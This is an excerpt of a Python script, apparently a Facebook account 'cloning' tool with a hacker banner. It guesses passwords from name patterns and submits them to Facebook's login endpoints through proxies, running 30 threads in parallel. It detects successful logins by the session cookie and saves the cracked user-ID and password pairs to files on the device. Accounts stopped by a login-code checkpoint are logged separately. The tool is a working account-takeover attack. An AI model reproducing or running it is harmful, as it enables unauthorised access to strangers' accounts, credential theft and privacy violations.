...
\033[1;90m   __    __  .___  ___.  __  ___ 
\033[1;91m |  |  |  | |   \/   | |  |/  / 
\033[1;93m |  |__|  | |  \  /  | |  '  /  
\033[1;92m |   __   | |  |\/|  | |    <   
\033[1;94m |  |  |  | |  |  |  | |  .  \  
\033[1;95m |__|  |__| |__|  |__| |__|\__\ 
\033[1;96m        Author = Error_404                          
\033[1;97m--------------------------------------------------------
\033[1;98m      we don't hack to impress we hack to express
\033[1;99m-------------------------------------------------------- """
...
def cloning_two(server_key,key_for_use):
    ...
    if clon_ == "1":
        ...
        print("\n")
        if lp.isnumeric():
            print(" Example : [ firstlast1234 first last first123 ] \n")
    ...
    def rana(user):
        ...
        for px in pp:
            ...
            my_fb = s.get('https://t.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%'+my_twof+'%2F&ref=dbl&fl&refid=8').text
            mydata = {
                ...
                "login":"Log In"}
            s.headers.update(head)
            llogin=("login.php?next=https%3A%2F%2mbasic.facebook.com")
            res = s.post('https://t.facebook.com/'+llogin+'%2Flogin%2Fdevice-based%2Fvalidate-password%2F%3Fshbl%3D0&ref=104&refsrc=deprecated',data=mydata,proxies=prox)
            ranasystem = (s.cookies.get_dict())
            #print(ranasystem)
            #print(ranasystem)
            if "c_user" in ranasystem: 
                print('\r{} [SUCCESSFULL] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/hmkoks.txt','a').write(f'{url}|{px}\n')
                oku.append(url)
                break
                ...
                if "Enter login code to continue" in title:
                    ...
                    cpu.append(url)
                    open('/sdcard/hmkcps.txt','a').write(f'{url}|{px}\n')
                    break
            else:
                continue
    ...
    with tpe(max_workers=30) as tp:
        tp.map(rana, idx)
    print("\n---------------------------------------------------------")
    print(" cloning has been finished now rest your phone  ")
    print("------------------------------------------------------------  ")
    exit()
